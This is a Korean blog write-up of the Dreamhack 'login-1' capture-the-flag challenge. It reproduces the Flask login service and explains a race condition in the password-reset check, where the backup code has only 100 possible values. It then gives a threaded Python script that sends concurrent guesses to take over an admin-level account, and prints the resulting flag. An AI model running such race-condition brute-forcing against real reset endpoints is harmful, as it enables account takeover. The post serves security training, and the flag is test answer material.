---
title: (24) Dreamhack login-1 문제 풀이
date: 2024-01-30 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
python으로 작성된 로그인 기능을 가진 서비스입니다.  
“admin” 권한을 가진 사용자로 로그인하여 플래그를 획득하세요.

## 문제 풀이
사이트가 어떻게 구현되었는지 살펴봅시다.
![](https://kyuyeop.github.io/assets/img/post/24/1.png)
로그인 페이지는 위와 같은 평범한 로그인 페이지이고, sqli는 안됩니다.
![](https://kyuyeop.github.io/assets/img/post/24/2.png)
비밀번호를 복구하는 페이지도 있는데, backupCode라는게 있어야 하는 모양입니다. 아래에서 코드를 뜯어보면서 자세히 알아봅시다.
![](https://kyuyeop.github.io/assets/img/post/24/3.png)
이 페이지는 `/user/<숫자>` 페이지 인데, 유저 정보를 보여줍니다. 숫자만 인식해서 여기도 sqli가 불가능하고요.
![](https://kyuyeop.github.io/assets/img/post/24/4.png)
레지스터 페이지도 있길래 test test test 입력해보았습니다.
![](https://kyuyeop.github.io/assets/img/post/24/5.png)
요런 창이 나옵니다. 위에서 봤던 BackupCode가 이걸 말하는 건가 봅니다.  

코드는 아래와 같습니다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
import sqlite3
import hashlib
import os
import time, random

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = "database.db"

userLevel = {
    0 : 'guest',
    1 : 'admin'
}
MAXRESETCOUNT = 5

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

def makeBackupcode():
    return random.randrange(100)

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ? and pw = ?', (userid, hashlib.sha256(password.encode()).hexdigest() )).fetchone()
        
        if user:
            session['idx'] = user['idx']
            session['userid'] = user['id']
            session['name'] = user['name']
            session['level'] = userLevel[user['level']]
            return redirect(url_for('index'))

        return "<script>alert('Wrong id/pw');history.back(-1);</script>";

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")
        name = request.form.get("name")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            return "<script>alert('Already Exists userid.');history.back(-1);</script>";

        backupCode = makeBackupcode()
        sql = "INSERT INTO user(id, pw, name, level, backupCode) VALUES (?, ?, ?, ?, ?)"
        cur.execute(sql, (userid, hashlib.sha256(password.encode()).hexdigest(), name, 0, backupCode))
        conn.commit()
        return render_template("index.html", msg=f"<b>Register Success.</b><br/>Your BackupCode : {backupCode}")

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";


@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";

@app.route('/admin')
def admin():
    if session and (session['level'] == userLevel[1]):
        return FLAG

    return "Only Admin !"

app.run(host='0.0.0.0', port=8000)
```
우리의 목표는
```python
@app.route('/admin')
def admin():
    if session and (session['level'] == userLevel[1]):
        return FLAG

    return "Only Admin !"
```
에 접속했을때 FLAG가 반환 되도록 admin 계정 즉, `userlevel = 1`인 계정으로 접속하는 것입니다.  
  
유저 생성에서 sqli가 막혀 있기 때문에 admin 권한의 유저를 생성하는건 힘들어 보입니다.  
따라서 admin 계정의 비밀번호를 변경하는 쪽으로 접근해보겠습니다.
```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";
```
코드를 보면 최대 5번 까지 시도할 수 있고, 이후로는 패스워드 변경이 막히게 됩니다.  
별다른 취약점도 없어보이고요.  
  
심지어 brute force를 막으려고 1초 기다리는 코드까지 있다고 주석까지 달아두었네요.  
  
하지만 놀랍게도, 이 문제의 풀이 방법은 brute force 입니다. 다만 그냥 순차적 진행하는 brute force가 아니라, 동시에 진행 하는 brute force 입니다.
```python
def makeBackupcode():
    return random.randrange(100)
```
위 코드처럼 백업코드가 0~99중 랜덤으로 설정됩니다.특별한 설명이 없으므로, 이미 만들었졌던 유저들에 대한 백업코드도 아마 같은 방식으로 만들어졌을 겁니다. 즉, 100개의 경우의 수에 대해 전부 넣어보는거죠. 이 정도면 모든 경우의 요청을 보내는 작업을 동시에 처리하는데 문제가 없을겁니다.
  
코드를 보면 post 요청이 오면 입력한 id의 유저 정보를 모두 가져옵니다. 코드에 `time.sleep`이 있으므로 이 코드는 잠깐 기다려야 합니다. 이 잠깐 동안 100개의 요청을 모두 보내면 `resetCount`가 업데이트 되기 전에 `MAXRESETCOUNT`와 비교하는 구문을 통과하여 코드가 처리될 수 있습니다. 또한 동시에 여러개의 코드가 보내지면 서버에 부하가 걸리면서 조금 더 시간이 벌 수 있을 수도 있겠고요(드림핵 서버에서 가상환경 만들어서 할게 분명하므로 서버 성능도 좋진 않을거임).
  
생각보다 널널해서 백업코드가 작은 숫자면 burp로도 뚫립니다. 한 60 보다 작은 정도면요.(burp는 왜 뚫렸는지 모르겠음...쓰레드로 돌리는 거였나..?)  
  
암튼 쓰레드를 이용해서 요청을 퍼붇도록 파이썬 코드를 짰습니다.
```python
import threading
import requests

url = "http://host3.dreamhack.games:10862/forgot_password"
arr = []

def change_pw(backupCode):
    data = {"userid": "Apple", "newpassword": "1", "backupCode": backupCode}
    requests.post(url, data=data)


if __name__ == "__main__":
    for i in range(1, 100):
        t = threading.Thread(target=change_pw, args=[i])
        t.start()
        arr.append(t)

    for _ in arr:
        _.join()
```
코드를 실행하면 몇초 안걸려서 끝납니다. 그리고 Apple에 1로 로그인 하면 로그인이 성공할 겁니다.  
  
이제 admin 페이지 들어가서 flag를 얻으시면 됩니다.  
글 쓰다가 잠깐 다른거 하고 왔더니 서버 만료되서 사진은 없습니다.
```
DH{4b308b526834909157a73567075c9ab7}
```
{% endraw %}